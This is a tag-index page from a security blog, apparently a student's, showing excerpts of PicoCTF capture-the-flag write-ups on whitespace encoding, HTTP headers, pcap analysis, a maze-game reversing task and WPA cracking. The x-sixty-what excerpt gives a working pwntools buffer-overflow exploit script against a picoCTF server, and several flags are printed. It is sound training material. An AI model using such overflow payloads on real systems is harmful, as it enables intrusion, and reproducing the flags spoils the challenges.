+<img src=https://hackmd.io/_uploads/S1PMPDSx6.png alt></li></ol></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/misc/general/picoctf---whitepages/>PicoCTF - WhitePages</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/misc/>Misc</a></div><p><h1 id=picoctf---whitepages>PicoCTF - WhitePages
+<a class=anchor href=#picoctf---whitepages>#</a></h1><h6 id=tags-picoctf-ctf-misc>tags: <code>PicoCTF</code> <code>CTF</code> <code>Misc</code>
+<a class=anchor href=#tags-picoctf-ctf-misc>#</a></h6><p>Challenge: <a href="https://play.picoctf.org/practice/challenge/51?category=4&amp;page=3">WhitePages</a></p><h2 id=source-code>Source code
+<a class=anchor href=#source-code>#</a></h2><p>:::spoiler source text</p><pre tabindex=0><code class=language-text! data-lang=text!>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+</code></pre><p>:::</p><h2 id=exploit---binary-encoding>Exploit - Binary Encoding
+<a class=anchor href=#exploit---binary-encoding>#</a></h2><p>If you use sublime editor to observe the file, then you may see the result as below.
+<img src=https://i.imgur.com/ME4F3hm.png alt>
+In unicode, <code>&lt;0x2003></code> is a kind of white space, then some gap between <code>&lt;0x2003></code> is a normal white space. Obviously, this is a binary encoding(<code>&lt;0x2003></code> is 0 and normal white space is 1)</p><a href=/security/practice/picoctf/misc/general/picoctf---whitepages/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/web/picoctf---who-are-you_/>PicoCTF - Who are you?</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/web/>Web</a></div><p><h1 id=picoctf---who-are-you>PicoCTF - Who are you?
+<a class=anchor href=#picoctf---who-are-you>#</a></h1><h6 id=tags-picoctf-ctf-web>tags: <code>PicoCTF</code> <code>CTF</code> <code>Web</code>
+<a class=anchor href=#tags-picoctf-ctf-web>#</a></h6><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><h3 id=chrome-85-更新淺談-referer-policy-和更新影響><a href=https://www.maxlist.xyz/2020/08/03/chrome-85-referer-policy/>【Chrome 85 更新】淺談 Referer-Policy 和更新影響</a>
+<a class=anchor href=#chrome-85-%e6%9b%b4%e6%96%b0%e6%b7%ba%e8%ab%87-referer-policy-%e5%92%8c%e6%9b%b4%e6%96%b0%e5%bd%b1%e9%9f%bf>#</a></h3><blockquote><h3 id=http-referer-是什麼>HTTP Referer 是什麼?
+<a class=anchor href=#http-referer-%e6%98%af%e4%bb%80%e9%ba%bc>#</a></h3><p>當使用者訪問網站時，會發送請求 (request) 給伺服器主機，而請求 header 中會有一個欄位是「referer」，而此欄位會存放當前請求來源的位置，也就是說請求的來源頁面。</p><p>舉個例子：當小明從「iT邦幫忙」網站中點擊連結後，進入「Max 行銷誌」網站時，所發送的 request 請求 referer 就會是 <a href=https://ithelp.ithome.com.tw/>https://ithelp.ithome.com.tw/</a> 的網址。</p></blockquote><h3 id=rfc-2616---date><a href=https://datatracker.ietf.org/doc/html/rfc2616#section-14.18>RFC 2616 - Date</a>
+<a class=anchor href=#rfc-2616---date>#</a></h3><blockquote><p>The Date general-header field represents the date and time at which
+the message was originated, having the same semantics as orig-date in
+RFC 822. The field value is an HTTP-date, as described in section
+3.3.1; it MUST be sent in RFC 1123 [8]-date format.</p><a href=/security/practice/picoctf/web/picoctf---who-are-you_/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/>PicoCTF - Wireshark twoo twooo two twoo...</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/misc/>Misc</a></div><p><h1 id=picoctf---wireshark-twoo-twooo-two-twoo>PicoCTF - Wireshark twoo twooo two twoo&mldr;
+<a class=anchor href=#picoctf---wireshark-twoo-twooo-two-twoo>#</a></h1><h6 id=tags-picoctf-ctf-misc>tags: <code>PicoCTF</code> <code>CTF</code> <code>Misc</code>
+<a class=anchor href=#tags-picoctf-ctf-misc>#</a></h6><p>Challenge: <a href="https://play.picoctf.org/practice/challenge/110?category=4&amp;page=1">Wireshark twoo twooo two twoo&mldr;</a></p><h2 id=exploit---dns--sub-domain>Exploit - DNS + sub-domain
+<a class=anchor href=#exploit---dns--sub-domain>#</a></h2><ol><li><p>Statistic
+Using statistic to analyze http requests and you&rsquo;ll see that there is <code>/flag</code> and <code>/</code> in address <code>18.217.1.57</code>. Maybe it&rsquo;s a clue or key to find flag
+<img src=https://i.imgur.com/VjobDhE.png alt></p></li><li><p>String search technique</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ strings shark2.pcapng | grep &#34;pico&#34;
+picoCTF{bfe48e8500c454d647c55a4471985e776a07b26cba64526713f43758599aa98b}
+picoCTF{bda69bdf8f570a9aaab0e4108a0fa5f64cb26ba7d2269bb63f68af5d98b98245}
+picoCTF{fe83bcb6cfd43d3b79392f6a4232685f6ed4e7a789c2ce559cf3c1ab6adbe34b}
+picoCTF{711d3893d90f100c15e10ef4842abeed3a830f8237c1257cd47389646da97810}
+picoCTF{3cf1e22d489fcfb6bb312a34f46c8699989ed043406134331452d11ce73cd59e}
+picoCTF{b4cc138bb0f7f9da7e35085e349555aa6d00bdca3b021c1fe8663c0a422ce0d7}
+picoCTF{41b8a1a796bd8d202016f75bc5b38889e9ea06007e6b22fc856d380fb7573133}
+...
+</code></pre><p>You&rsquo;ll find tons of fake flag. Obviously, it&rsquo;s a trap to distract you.</p><a href=/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/reverse/picoctf---wizardlike/>PicoCTF - Wizardlike</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/reverse/>Reverse</a></div><p><h1 id=picoctf---wizardlike>PicoCTF - Wizardlike
+<a class=anchor href=#picoctf---wizardlike>#</a></h1><h2 id=recon>Recon
+<a class=anchor href=#recon>#</a></h2><p>這一題蠻有趣的，如果只是單純執行程式碼，會發現是一個迷宮的遊戲，不過走越多會發現兩個現象</p><ol><li>遊戲本身根本無法破關</li><li>有一些"道路"回隨著角色本身的移動慢慢浮現出來</li></ol><p>我也不知道是哪來的想法直覺想要看他的地圖，因為看IDA翻出來的code，貌似有十個關卡，而如果把地圖翻出來會發現每一個關卡總共會有10000個字元，然後每一列都是100個字元呈現，然後就發現他其實是用地圖的方式呈現他的flag，則我們可以先把10個關卡的所有字元另存一個檔案(純手工)，再寫一點點script就可以把flag還原</p><h2 id=exploit---通靈>Exploit - 通靈
+<a class=anchor href=#exploit---%e9%80%9a%e9%9d%88>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>f <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;./cipher.txt&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>)<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>pt <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;./flag.txt&#39;</span>, <span style=color:#e6db74>&#39;w&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>join([f[<span style=color:#ae81ff>100</span> <span style=color:#f92672>*</span> i : <span style=color:#ae81ff>100</span> <span style=color:#f92672>*</span> i <span style=color:#f92672>+</span> <span style=color:#ae81ff>100</span>] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(f) <span style=color:#f92672>//</span> <span style=color:#ae81ff>100</span>)])
+</span></span><span style=display:flex><span>pt<span style=color:#f92672>.</span>write(flag)
+</span></span></code></pre></div><p>:::spoiler flag</p><pre tabindex=0><code>#########                                                                                           
+#.......#  ......#...................................                                               
+#.......#  ....................####.#####.#####..###.                                               
+#........  .####.#..###..###..#.......#...#......#...                                               
+#.......#  .#  #.#.#....#   #.#.......#...###...#....                                               
+#.......#  .####.#.#....#   #.#.......#...#......#...                                               
+#.......#  .#....#..###..###...####...#...#......###.                                               
+#.......#  .#........................................                                               
+#.......#  ..........................................                                               
+#.......#                                                                                           
+#.......#                                                                                           
+#.......#                                                                                           
+#.......#                                                                                           
+#.......#                                                                                           
+#......&gt;#                                                                                           
+#########                                                                                           
+#####. .............................................................                                
+#.&lt;.#. ...............#..#.............##.......#..#........#.......                                
+#...#. .#..#.###......#..#.......#...#..#.####..#..#.###....#.......                                
+#...#. .#..#.#........####.......#.#.#..#...#...####.#...####.......                                
+#...#. .####.#...####....#.#####..#.#..###.####....#.#...####.#####.                                
+  .    .............................................................                                
+  .    .............................................................                                
+  .    .............................................................                                
+#....                                                                                               
+#...#                                                                                               
+#...#                                                                                               
+#...#                                                                                               
+#...#                                                                                               
+#...#                                                                                               
+#.&gt;.#                                                                                               
+#####                                                                                               
+#################   .......                                                                         
+#&lt;..............#.  ..###..                                                                         
+#...............#.. .#...#.                                                                         
+#..............#......###..                                                                         
+#...#.......#...#.. .#...#.                                                                         
+#..###.....###..#.  ..###..                                                                         
+#...#...#...#...#   .......                                                                         
+#......#&gt;#......#   .......                                                                         
+#...............#                                                                                   
+#...#.......#...#                                                                                   
+#..###.....###..#                                                                                   
+#...#.......#...#                                                                                   
+#...............#                                                                                   
+#...............#                                                                                   
+#...............#                                                                                   
+#################                                                                                   
+...             ..  .......                                                                         
+.&lt;.          ####.  .#####.                                                                         
+...          ...#.. .#.....                                                                         
+...          ...#....###...                                                                         
+             ..&gt;#.. .#.....                                                                         
+             ####.  .#.....                                                                         
+                ..  .......                                                                         
+                    .......                                                                         
+                    
+########################                                                                            
+#&lt;.............#.......#                                                                            
+#..............#.#...#.#                                                                            
+#..............#.#...#.#                                                                            
+#..............#.#####.#                                                                            
+#..............#.....#.#                                                                            
+#..............#.....#.#                                                                            
+#..............#.......#                                                                            
+#..............#.......#                                                                            
+########################                                                                            
+.......                                                                                             
+.&lt;.....                                                                                             
+.......                                                                                             
+.......                                                                                             
+.......                                                                                             
+.......                                                                                             
+.......                                                                                             
+.......                                                                                             
+.......                                                                                             
+.......                                                                                             
+.......                                                                                             
+.....&gt;.                                                                                             
+.......                                                                                             
+#######                                                                                             
+.......                                                                                             
+.####..                                                                                             
+.#...#.                                                                                             
+.####..                                                                                             
+.#...#.                                                                                             
+.####..                                                                                             
+.......                                                                                             
+.......                                                                                             
+...                                                                                                 
+.&lt;.........                                                                                         
+...........                                                                                         
+...      ..                                                                                         
+         ..                                                                                         
+         ..                                                                                         
+         ..                                                                                         
+         ..                                                                                         
+         ..                                                                                         
+         ..                                                                                         
+   ..............                                                                                   
+   ..##########..                                                                                   
+   .#          #.                                                                                   
+   .#  ....... #.                                                                                   
+   .#  ..###.. #.                                                                                   
+   .#  .#...#. #.                                                                                   
+   .#  .#...#. #.                                                                                   
+   .#  .#...#. #.                                                                                   
+   .#  ..###.. #.                                                                                   
+   .#  ....... #.                                                                                   
+   .#  ....... #.                                                                                   
+   .#          #.                                                                                   
+   ..##########..                                                                                   
+   .............&gt;                                                                                   
+#########################                                                                           
+#&lt;#......#.#.......###..#                                                                           
+#.#.###..#.#.......##..##                                                                           
+#.#.#.#..#.#.......#..###                                                                           
+#.#.#.#..#.#.......#...##                                                                           
+#...#....#..#......#....#                                                                           
+#.######.##..###.###....#                                                                           
+#.#.....................#                                                                           
+#.###.#################.#                                                                           
+#.......................#                                                                           
+#########.###.#########.#                                                                           
+#.......#.#.#.#.........#                                                                           
+#.#...#.#.#...#.#########                                                                           
+#.#...#.#.#.#.#.........#                                                                           
+#.#####.#.#.#.#########.#                                                                           
+#.....#.#.#.#.#.........#                                                                           
+#.....#.#.#.#.#.#########                                                                           
+#.......#.#.#.#.........#                                                                           
+#.......#.#.#.#########.#                                                                           
+#########.#.#.#...#...#.#                                                                           
+#...........#.#.#.#.#.#.#                                                                           
+#########...#.#.#.#.#.#.#                                                                           
+#.......#...#.#.#.#.#.#.#                                                                           
+####.####...#.#.#.#.#.#.#                                                                           
+##..........#.#.#.#.#.#.#                                                                           
+#.#..####...#.#.#.#.#.#.#                                                                           
+#..#....#####.#.#.#.#.#.#                                                                           
+#...#...#...#.#.#...#...#                                                                           
+#....#........#.#########                                                                           
+#...........#.#........&gt;#                                                                           
+########################.                                                                           
+...                                                                                          .......
+.&lt;.                                                                                          ..###..
+...                                                                                          .#...#.
+...                                                                                          .#####.
+                                                                                             .#...#.
+                                                                                             .#...#.
+                                                                                             .......
+                                                                                             .......
+                                                                                             
+#####################################################################################..............#
+#####################################################################################.#####.###....#
+#####################################################################################.#.......#....#
+#####################################################################################.###......#...#
+#####################################################################################.#.......#....#
+#####################################################################################.#####.###....#
+#####################################################################################..............#
+#####################################################################################..............#
+</code></pre><p>:::</p><a href=/security/practice/picoctf/reverse/picoctf---wizardlike/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/>PicoCTF - WPA-ing Out</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/misc/>Misc</a></div><p><h1 id=picoctf---wpa-ing-out>PicoCTF - WPA-ing Out
+<a class=anchor href=#picoctf---wpa-ing-out>#</a></h1><h6 id=tags-picoctf-ctf-misc>tags: <code>PicoCTF</code> <code>CTF</code> <code>Misc</code>
+<a class=anchor href=#tags-picoctf-ctf-misc>#</a></h6><p>Challenge: <a href="https://play.picoctf.org/practice/challenge/206?category=4&amp;page=2">WPA-ing Out</a></p><h2 id=background>Background
+<a class=anchor href=#background>#</a></h2><p><a href=https://ithelp.ithome.com.tw/articles/10280033>Day 26 Wireless Attacks-無線攻擊(aircrack-ng)</a></p><h2 id=description--hint>Description & Hint
+<a class=anchor href=#description--hint>#</a></h2><blockquote><p>I thought that my password was super-secret, but it turns out that passwords passed over the AIR can be CRACKED, especially if I used the same wireless network password as one in the <font color=FF0000><code>rockyou.txt</code></font> credential dump. Use this <a href=https://artifacts.picoctf.net/c/8/wpa-ing_out.pcap><code>pcap file</code></a> and the <code>rockyou</code> wordlist. The flag should be entered in the <code>picoCTF{XXXXXX}</code> format.</p><a href=/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/practice/picoctf/pwn/picoctf---x-sixty-what/>PicoCTF - x-sixty-what</a></h2><div class=text-small><a href=/tags/picoctf/>PicoCTF</a>,
+<a href=/tags/ctf/>CTF</a>,
+<a href=/tags/pwn/>PWN</a></div><p><h1 id=picoctf---x-sixty-what>PicoCTF - x-sixty-what
+<a class=anchor href=#picoctf---x-sixty-what>#</a></h1><h2 id=source-code>Source code
+<a class=anchor href=#source-code>#</a></h2><p>:::spoiler</p><pre tabindex=0><code class="language-cpp=" data-lang="cpp="></code></pre><p>:::</p><h2 id=recon>Recon
+<a class=anchor href=#recon>#</a></h2><p>這一題有點奇怪，沒有想像中簡單，看起來就是一個簡單的return 2 function的問題，但是看了objdump的flag function原本應該是0x401236，但是會友segmentation fault，看了其他的WP<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>，發現應該return到0x40123b，不太知道為甚麼</p><ul><li><p>第一張是return 2 0x401236
+<img src=https://hackmd.io/_uploads/Bk2PZ_0ch.png alt></p></li><li><p>第二張是return 2 0x40123b
+<img src=https://hackmd.io/_uploads/SymO-uAqn.png alt></p></li></ul><h2 id=exploit>Exploit
+<a class=anchor href=#exploit>#</a></h2><ol><li>用動態的方式看offset
+$$
+0x7fffffffd758 - 0x00007fffffffd710 = 0x48
+$$</li></ol><pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *
+
+r = remote(&#39;saturn.picoctf.net&#39;, 58166)
+# r = process(&#39;./vuln&#39;)
+context.arch = &#39;amd64&#39;
+
+raw_input()
+print(r.recvline().strip().decode())
+
+payload = b&#39;a&#39;*0x48 + p64(0x40123b)
+print(payload)
+r.sendline(payload)
+
+r.interactive()
+</code></pre><p>Flag: <code>picoCTF{b1663r_15_b3773r_e79d5a75}</code></p><h2 id=reference>Reference
+<a class=anchor href=#reference>#</a></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://ctftime.org/writeup/33199>x-sixty-what WP</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p><a href=/security/practice/picoctf/pwn/picoctf---x-sixty-what/>...</a></p></article><ul class="pagination pagination-default"><li class=page-item><a href=/tags/picoctf/ aria-label=First class=page-link role=button><span aria-hidden=true>&#171;&#171;</span></a></li><li class=page-item><a href=/tags/picoctf/page/10/ aria-label=Previous class=page-link role=button><span aria-hidden=true>&#171;</span></a></li><li class=page-item><a href=/tags/picoctf/page/8/ aria-label="Page 8" class=page-link role=button>8</a></li><li class=page-item><a href=/tags/picoctf/page/9/ aria-label="Page 9" class=page-link role=button>9</a></li><li class=page-item><a href=/tags/picoctf/page/10/ aria-label="Page 10" class=page-link role=button>10</a></li><li class="page-item active"><a aria-current=page aria-label="Page 11" class=page-link role=button>11</a></li><li class=page-item><a href=/tags/picoctf/page/12/ aria-label="Page 12" class=page-link role=button>12</a></li><li class=page-item><a href=/tags/picoctf/page/12/ aria-label=Next class=page-link role=button><span aria-hidden=true>&#187;</span></a></li><li class=page-item><a href=/tags/picoctf/page/12/ aria-label=Last class=page-link role=button><span aria-hidden=true>&#187;&#187;</span></a></li></ul><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
+<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
+<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
+<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
+<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
+<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
+<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
+<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
+<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
+<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
+<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
+<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
+<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
+<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
+<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
+<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
+<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
+<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
+<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
+<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
+<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
+<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
+<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
+<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
+<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
+<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
+<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
+<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
+<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
+<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
+<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
+<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
+<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
+<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
+<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
+<span>2</span></li></ul></li></ul></nav></div></aside></main></body></html>
